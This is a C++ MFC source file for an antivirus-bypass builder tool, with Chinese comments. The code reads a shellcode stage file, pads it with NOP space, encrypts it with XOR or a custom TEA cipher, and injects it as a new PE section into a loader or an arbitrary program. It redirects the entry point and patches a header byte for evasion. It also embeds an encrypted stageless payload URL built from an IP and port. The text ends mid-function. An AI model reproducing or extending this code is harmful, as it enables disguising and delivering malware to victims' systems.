
// byPassAVMakeDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "byPassAVMake.h"
#include "byPassAVMakeDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CbyPassAVMakeDlg 对话框



CbyPassAVMakeDlg::CbyPassAVMakeDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_BYPASSAVMAKE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CbyPassAVMakeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, mSecName);
	DDX_Control(pDX, IDC_EDIT2, mCodesLen);
	DDX_Control(pDX, IDC_LIST1, mList);
	DDX_Control(pDX, IDC_EDIT3, mFileBin);
	DDX_Control(pDX, IDC_EDIT4, mDstFile);
	DDX_Control(pDX, IDC_EDIT5, mStagelessURL);
	DDX_Control(pDX, IDC_EDIT6, mStagelessIP);
	DDX_Control(pDX, IDC_EDIT7, mPort);
}

BEGIN_MESSAGE_MAP(CbyPassAVMakeDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CbyPassAVMakeDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CbyPassAVMakeDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CbyPassAVMakeDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CbyPassAVMakeDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON5, &CbyPassAVMakeDlg::OnBnClickedButton5)
	ON_BN_CLICKED(IDC_BUTTON6, &CbyPassAVMakeDlg::OnBnClickedButton6)
	ON_BN_CLICKED(IDC_BUTTON7, &CbyPassAVMakeDlg::OnBnClickedButton7)
	ON_BN_CLICKED(IDC_BUTTON8, &CbyPassAVMakeDlg::OnBnClickedButton8)
END_MESSAGE_MAP()


// CbyPassAVMakeDlg 消息处理程序

BOOL CbyPassAVMakeDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	mSecName.SetWindowText(".rsrc");
	mCodesLen.SetWindowTextA("0");

	TCHAR  column[][MAX_HEADLENGTH] = { "地址","HEX 数据","反汇编" };
	this->mList.SetHeaders(column, sizeof(column) / sizeof(*column));
	//改变对齐方式
	LVCOLUMN co = { 0 };
	co.mask = LVCF_FMT;
	this->mList.GetColumn(0, &co);
	co.fmt |= LVS_ALIGNLEFT;
	this->mList.SetColumn(1, &co);
	this->mList.SetColumn(2, &co);
	this->mList.SetColumnWidth(0, 65);

	mCodesLen.SetWindowTextA("10");
	::EnableWindow(mCodesLen, FALSE);
	CheckDlgButton(IDC_RADIO4, TRUE);
	mPort.SetWindowTextA("8181");

	//MemMgr::GetInstance().SetDebug2File(true);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CbyPassAVMakeDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CbyPassAVMakeDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CbyPassAVMakeDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

//随机生成数据
void CbyPassAVMakeDlg::Randomkey(unsigned char* key, unsigned int len)
{
	memset(key, 0, len);
	srand(0x5f4567);
	srand(GetTickCount() + rand());
	for (int i = 0; i < len; i++)
	{
		int seed = rand();
		unsigned char r = seed;
		memcpy(key + i, &r, 0x1);
	}
}

//自定义加密算法基算法
void CbyPassAVMakeDlg::encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
{
	unsigned long code[4];
	register unsigned long i = 0x10, j = 0, m, n;

	m = htonl(in[0]);
	n = htonl(in[1]);
	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
	code[2] = htonl(key[2]); code[3] = htonl(key[3]);
	while (i-- > 0) {
		j += 0xab451fc4;
		m += ((n >> 5) + code[1]) ^ ((n << 4) + code[0]) ^ (j + n);
		n += ((m >> 5) + code[3]) ^ ((m << 4) + code[2]) ^ (j + m);
	}
	out[0] = htonl(m);
	out[1] = htonl(n);
}

void CbyPassAVMakeDlg::decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
{

	unsigned long code[4];
	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;

	sum = delta * n;
	y = htonl(in[0]);
	z = htonl(in[1]);

	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
	code[2] = htonl(key[2]); code[3] = htonl(key[3]);

	while (n-- > 0)
	{
		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
		sum -= delta;
	}
	out[0] = htonl(y);
	out[1] = htonl(z);
}

//自定义加密算法
void CbyPassAVMakeDlg::tea_encrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
{
	register int m, i, j, count, p = 1;
	unsigned char q[12], * q1, * q2, * inp;
	unsigned char mkey[8];

	m = (inlen + 10) % 8;
	if (m)  m = 8 - m;

	*outlen = m + 3 + inlen;
	if (*outlen % 8 != 0)
	{
		*outlen = (*outlen / 8 + 1) * 8;
	}
	*out = (unsigned char*)malloc(*outlen);
	memset(*out, 0, *outlen);

	q[0] = (rand() & 0xf8) | m;
	i = j = 1;
	while (m > 0) {
		q[i++] = rand() & 0xff;
		m--;
	}
	count = 0;
	q2 = q1 = *out;
	memset(mkey, 0, sizeof(mkey));
	while (p <= 2) {
		if (i < 8) {
			q[i++] = rand() & 0xff;
			p++;
		}
		if (i == 8) {
			for (i = 0; i < 8; i++)
				q[i] ^= mkey[i];
			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)(*out));
			for (i = 0; i < 8; i++)
				q1[i] ^= mkey[i];
			q2 = q1;
			q1 += 8;
			count += 8;
			memcpy(mkey, q, 8);
			j = i = 0;
		}
	}
	inp = in;
	while (inlen > 0) {
		if (i < 8) {
			q[i] = inp[0];
			inp++;
			i++;
			inlen--;
		}
		if (i == 8) {
			for (i = 0; i < 8; i++) {
				if (j) q[i] ^= mkey[i];
				else q[i] ^= q2[i];
			}
			j = 0;
			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)q1);
			for (i = 0; i < 8; i++)
				q1[i] ^= mkey[i];
			count += 8;
			memcpy(mkey, q, 8);
			q2 = q1;
			q1 += 8;
			i = 0;
		}
	}
	p = 1;
	while (p < 8) {
		if (i < 8) {
			memset(q + i, 0, 4);
			p++;
			i++;
		}
		if (i == 8) {
			for (i = 0; i < 8; i++)
				q[i] ^= q2[i];
			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)q1);
			for (i = 0; i < 8; i++)
				q1[i] ^= mkey[i];
			memcpy(mkey, q, 8);
			count += 8;
			q2 = q1;
			q1 += 8;
			i = 0;
		}
	}
	_ASSERT(*outlen == count);
}

//自定义解密算法
void CbyPassAVMakeDlg::tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
{
	unsigned char q[8], mkey[8], * q1, * q2, * outp;
	register int count, i, j, p;

	if (inlen % 8 || inlen < 16) return;
	/* get basic information of the packet */
	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
	j = q[0] & 0x7;
	count = inlen - j - 10;
	*outlen = count;
	*out = (unsigned char*)malloc(*outlen);
	if (*out == NULL) return;
	memset(*out, 0, *outlen);


	if (count < 0) return;

	memset(mkey, 0, 8);
	q2 = mkey;
	i = 8; p = 1;
	q1 = in + 8;
	j++;
	while (p <= 2)
	{
		if (j < 8)
		{
			j++;
			p++;
		}
		else if (j == 8)
		{
			q2 = in;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen) return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	outp = *out;
	while (count != 0)
	{
		if (j < 8)
		{
			outp[0] = q2[j] ^ q[j];
			outp++;
			count--;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1 - 8;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	for (p = 1; p < 8; p++)
	{
		if (j < 8)
		{
			if (q2[j] ^ q[j])
				return;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
}


//反汇编补丁代码
BOOL CbyPassAVMakeDlg::InitDisaDate(STu8* pPatch, STu32 dwSize)
{
	//先清除数据
	mList.DeleteAllItems();

	ULONGLONG offset = 0;//用于反汇编地址偏移
	unsigned int mode = 0;
	//判断机器位数
#ifdef PE_MODEL
	mode = 32;
#else
	mode = 64;
#endif

	char* pCode = (char*)pPatch;
	unsigned int size = dwSize;
	unsigned int pStartAddr = 0;

	for (unsigned int len = 0, i = 0; len < size; i++)
	{
		CString strBuffer;
		strBuffer.Format("%08X", pStartAddr + len);
		this->mList.InsertItem(i, strBuffer);
		t_disasm da;
		len += Disasm(pCode + len, MAXCMDSIZE, pStartAddr + len, &da, DISASM_CODE);
		if (da.cmdtype == C_CAL)
		{
			//call指令
			if (*(pCode + len) == 0x2F)
			{
				mStagelessURL.SetWindowTextA(CString(pCode + len));
			}
			else if (*(pCode + len + 1) == 0x2E || *(pCode + len + 2) == 0x2E || *(pCode + len + 3) == 0x2E)
			{
				mStagelessIP.SetWindowTextA(CString(pCode + len));
			}
		}
		//端口是push 立即数，暂时无法解析
		//else if (strcmp(da.vm_name, "VPUSH_IMM32") == 0 && (da.immconst>=80 && da.immconst<=65535))
		//{
		//	//push指令
		//}
		strBuffer.Empty();
		strBuffer.Append(da.dump);
		this->mList.SetItemText(i, 1, strBuffer);
		strBuffer.Empty();
		strBuffer.Append(da.result);
		this->mList.SetItemText(i, 2, strBuffer);
	}
	return TRUE;
}

//混肴代码
void CbyPassAVMakeDlg::ConfusionCodes(STu8 *oricode, STu32 oricodesize, STu8 ** dstcode, STu32 * dstcodesize)
{
	int i, j, n;
	ulong l;
	char* pasm;
	t_asmmodel am;
	char s[TEXTLEN], errtext[TEXTLEN];

	pasm = "ADD [DWORD 475AE0],1";
	Assemble(pasm, 0x400000, &am, 0, 0, errtext);
}

//捆绑stage到任意程序
void CbyPassAVMakeDlg::OnBnClickedButton8()
{
	UpdateData(TRUE);
	CString strName;
	mSecName.GetWindowText(strName);
	if (strName.GetLength() == 0)
	{
		AfxMessageBox("区段名为空!");
		return;
	}
	//计算花指令，反调试代码预留空间
	STu32 nopbytes = 0;
	CString strNopBytes;
	mCodesLen.GetWindowText(strNopBytes);
	nopbytes = strtoll(strNopBytes, 0, 0x10);

	//加载bin文件shellcode数据
	CString binFile = "";
	mFileBin.GetWindowTextA(binFile);
	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == mHandle)
	{
		AfxMessageBox("stage打开失败!");
		return;
	}

	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件太大!");
		return;
	}
	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
	if (pVirMem == NULL)
	{
		CloseHandle(mHandle);
		AfxMessageBox("内存分配失败!");
		return;
	}

	DWORD readsize;
	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}

	if (readsize != dwShellCodeSize)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}
	CloseHandle(mHandle);

	//处理shellcode数据，增加花指令,暂时填充NOP
	if (nopbytes)
		memset(pVirMem, 0x90, nopbytes);

	dwShellCodeSize += nopbytes;
	//STu8* shellcode = 0;
	//STu32 shellcodesize = 0;
	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
	//卸载大内存
	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);

	//shellcode数据添加到目标程序新区段
	bool bRet = mPEMake.AddPatchAuto2OEP((STu8*)strName.GetBuffer(0), pVirMem, dwShellCodeSize, 0);
	if (bRet)
	{
		OnSaveAs();
		//CDialogEx::OnOK();
	}
	else
		CDialogEx::OnCancel();

}

//捆绑stage到加载器
void CbyPassAVMakeDlg::OnBnClickedButton1()
{
	UpdateData(TRUE);
	CString strName;
	mSecName.GetWindowText(strName);
	if (strName.GetLength() == 0)
	{
		AfxMessageBox("区段名为空!");
		return;
	}
	//计算花指令，反调试代码预留空间
	STu32 nopbytes = 0;
	CString strNopBytes;
	mCodesLen.GetWindowText(strNopBytes);
	nopbytes = strtoll(strNopBytes, 0, 0x10);

	//加载bin文件shellcode数据
	CString binFile = "";
	mFileBin.GetWindowTextA(binFile);
	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == mHandle)
	{
		AfxMessageBox("stage打开失败!");
		return;
	}

	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件太大!");
		return;
	}
	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
	if (pVirMem == NULL)
	{
		CloseHandle(mHandle);
		AfxMessageBox("内存分配失败!");
		return;
	}

	DWORD readsize;
	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}

	if (readsize != dwShellCodeSize)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}
	CloseHandle(mHandle);

	//处理shellcode数据，增加花指令,暂时填充NOP
	if (nopbytes)
		memset(pVirMem, 0x90, nopbytes);
	
	STu8* shellcode = 0;
	STu32 shellcodesize = 0;
	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
	//卸载大内存
	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
	
	//处理shellcode数据，加密shellcode代码
	ByteBuffer encPacket;
	if (IsDlgButtonChecked(IDC_RADIO1))
	{
		//封装加密类型
		encPacket.append(H_ENC_XOR);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGE);
		scPacket.append(STu32(dwVirMemSize));
		scPacket.append(pVirMem, dwVirMemSize);
		STu8 XOR_BYTES[0x10];
		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(STu32(scPacket.size()));
		//XOR加密
		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
		for (int i = 0; i < scPacket.size(); i++)
		{
			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
		}
	}
	else if (IsDlgButtonChecked(IDC_RADIO2))
	{
		//aes加密
		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
	}
	else if (IsDlgButtonChecked(IDC_RADIO3))
	{
		//RC4加密
		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
	}
	else if (IsDlgButtonChecked(IDC_RADIO4))
	{
		//封装加密类型
		encPacket.append(H_ENC_TEA);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGE);
		scPacket.append(STu32(dwVirMemSize));
		scPacket.append(pVirMem, dwVirMemSize);
		STu8 TEA_KEY[0x10];
		Randomkey(TEA_KEY, sizeof(TEA_KEY));
		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
		//tea加密
		unsigned char* out = 0;
		unsigned int outlen = 0;
		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);

		//封装加密数据
		encPacket.append(STu32(outlen));
		encPacket.append(out, outlen);
		free(out);
	}

	//shellcode数据添加到目标程序新区段
	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), encPacket.contents(), encPacket.size(), IMAGE_SCN_MEM_READ /* | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE */);
	if (bRet)
	{
		//lordpe免杀
		DWORD offset = mPEMake.mPeCtx.pe.mDosHeader.e_lfanew + sizeof(mPEMake.mPeCtx.pe.mNtHeader);
		offset = offset + sizeof(SectionHeader) * (mPEMake.mPeCtx.pe.mNtHeader.FileHeader.NumberOfSections - 1);
		mPEMake.mPeCtx.pVirMem[offset + 7] = 0x7;
		OnSaveAs(); 
		//CDialogEx::OnOK();
	}
	else
		CDialogEx::OnCancel();
}

//捆绑stageless url到加载器
void CbyPassAVMakeDlg::OnBnClickedButton5()
{
	UpdateData(TRUE);
	CString strName;
	mSecName.GetWindowText(strName);
	if (strName.GetLength() == 0)
	{
		AfxMessageBox("区段名为空!");
		return;
	}

	//封装stageless url
	CStringA url;
	mStagelessURL.GetWindowTextA(url);
	CStringA ip;
	mStagelessIP.GetWindowTextA(ip);
	CString port;
	mPort.GetWindowTextA(port);
	if (ip.GetLength() <= 0 || port.GetLength() == 0)
	{
		AfxMessageBox("stageless url非法!");
		return;
	}

	CStringA _url = "http://" + ip + ":" + port + url;
	ByteBuffer shellcode;
	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());

	//处理shellcode数据，加密shellcode代码
	ByteBuffer encPacket;
	if (IsDlgButtonChecked(IDC_RADIO1))
	{
		//封装加密类型
		encPacket.append(H_ENC_XOR);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGELESSURL);
		scPacket.append(STu32(shellcode.size()));
		scPacket.append(shellcode.contents(), shellcode.size());
		STu8 XOR_BYTES[0x10];
		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(STu32(scPacket.size()));
		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
		for (int i = 0; i < scPacket.size(); i++)
		{
			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
		}
	}
	else if (IsDlgButtonChecked(IDC_RADIO2))
	{
		//aes加密
		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
	}
	else if (IsDlgButtonChecked(IDC_RADIO3))
	{
		//RC4加密
		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
	}
	else if (IsDlgButtonChecked(IDC_RADIO4))
	{
		//封装加密类型
		encPacket.append(H_ENC_TEA);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGELESSURL);
		scPacket.append(STu32(shellcode.size()));
		scPacket.append(shellcode.contents(), shellcode.size());

		STu8 TEA_KEY[0x10];
		Randomkey(TEA_KEY, sizeof(TEA_KEY));
		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
		unsigned char* out = 0;
		unsigned int outlen = 0;
		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
		//封装加密数据
		encPacket.append(STu32(outlen));
		encPacket.append(out, outlen);
		free(out);
	}

	//shellcode数据添加到目标程序新区段
	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), encPacket.contents(), encPacket.size(), IMAGE_SCN_MEM_READ /* | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE*/);
	if (bRet)
	{
		OnSaveAs();
		//CDialogEx::OnOK();
	}
	else
		CDialogEx::OnCancel();
}

//分离加密stage文件
void CbyPassAVMakeDlg::OnBnClickedButton6()
{
	//计算花指令，反调试代码预留空间
	STu32 nopbytes = 0;
	CString strNopBytes;
	mCodesLen.GetWindowText(strNopBytes);
	nopbytes = strtoll(strNopBytes, 0, 0x10);
	//加载bin文件shellcode数据
	CString binFile = "";
	mFileBin.GetWindowTextA(binFile);
	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == mHandle)
	{
		AfxMessageBox("文件打开失败!");
		return;
	}

	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件太大!");
		return;
	}
	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
	if (pVirMem == NULL)
	{
		CloseHandle(mHandle);
		AfxMessageBox("内存分配失败!");
		return;
	}

	DWORD readsize;
	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}

	if (readsize != dwShellCodeSize)
	{
		CloseHandle(mHandle);
		AfxMessageBox("文件读取失败!");
		return;
	}
	CloseHandle(mHandle);

	//处理shellcode数据，增加花指令,暂时填充NOP
	if (nopbytes)
		memset(pVirMem, 0x90, nopbytes);

	STu8* shellcode = 0;
	STu32 shellcodesize = 0;
	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
	//卸载大内存
	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);

	//处理shellcode数据，加密shellcode代码
	ByteBuffer encPacket;
	if (IsDlgButtonChecked(IDC_RADIO1))
	{
		//封装加密类型
		encPacket.append(H_ENC_XOR);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGE);
		scPacket.append(STu32(dwVirMemSize));
		scPacket.append(pVirMem, dwVirMemSize);
		STu8 XOR_BYTES[0x10];
		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
		//添加密钥
		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(STu32(scPacket.size()));

		//XOR加密
		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
		for (int i = 0; i < scPacket.size(); i++)
		{
			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
		}
	}
	else if (IsDlgButtonChecked(IDC_RADIO2))
	{
	}
	else if (IsDlgButtonChecked(IDC_RADIO3))
	{
		//RC4加密
		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
	}
	else if (IsDlgButtonChecked(IDC_RADIO4))
	{
		//封装加密类型
		encPacket.append(H_ENC_TEA);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGE);
		scPacket.append(STu32(dwVirMemSize));
		scPacket.append(pVirMem, dwVirMemSize);

		//tea加密
		//随机生成密钥
		STu8 TEA_KEY[0x10];
		Randomkey(TEA_KEY, sizeof(TEA_KEY));
		unsigned char* out = 0;
		unsigned int outlen = 0;
		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);

		//封装密钥
		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
		//封装加密数据
		encPacket.append(STu32(outlen));
		encPacket.append(out, outlen);
		free(out);
	}

	//加密数据保存到文件
	binFile += ".enc";
	CFile mFile(binFile, CFile::modeCreate | CFile::modeReadWrite);
	mFile.Write(encPacket.contents(), encPacket.size());
	mFile.Close();
	AfxMessageBox("保存成功");
}

//分离加密stageless url文件
void CbyPassAVMakeDlg::OnBnClickedButton7()
{
	UpdateData(TRUE);
	CString strName;
	mSecName.GetWindowText(strName);
	if (strName.GetLength() == 0)
	{
		AfxMessageBox("区段名为空!");
		return;
	}
	CString binFile = "";
	mFileBin.GetWindowTextA(binFile);

	//封装stageless url
	CStringA url;
	mStagelessURL.GetWindowTextA(url);
	CStringA ip;
	mStagelessIP.GetWindowTextA(ip);
	CString port;
	mPort.GetWindowTextA(port);
	if (ip.GetLength() <= 0 || port.GetLength() == 0)
	{
		AfxMessageBox("stageless url非法!");
		return;
	}
	CStringA _url = "http://" + ip + ":" + port + url;
	ByteBuffer shellcode;
	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());

	//处理shellcode数据，加密shellcode代码
	ByteBuffer encPacket;
	if (IsDlgButtonChecked(IDC_RADIO1))
	{
		//封装加密类型
		encPacket.append(H_ENC_XOR);

		//封装SCPacket
		ByteBuffer scPacket;
		scPacket.append(P_TYPE_STAGELESSURL);
		scPacket.append(STu32(shellcode.size()));
		scPacket.append(shellcode.contents(), shellcode.size());
		STu8 XOR_BYTES[0x10];
		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
		//添加密钥
		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
		encPacket.append(STu32(scPacket.size()));

		//XOR加密
		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
		for (int i = 0; i < scPacket.size(); i++)
		{
			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
		}
	}
	else if (IsDlgButtonChecked(IDC_RADIO2))
	{
		//aes加密
	}
	else if (IsDlgButtonChecked(IDC_RADIO3))
	{
		//RC4加密
	}
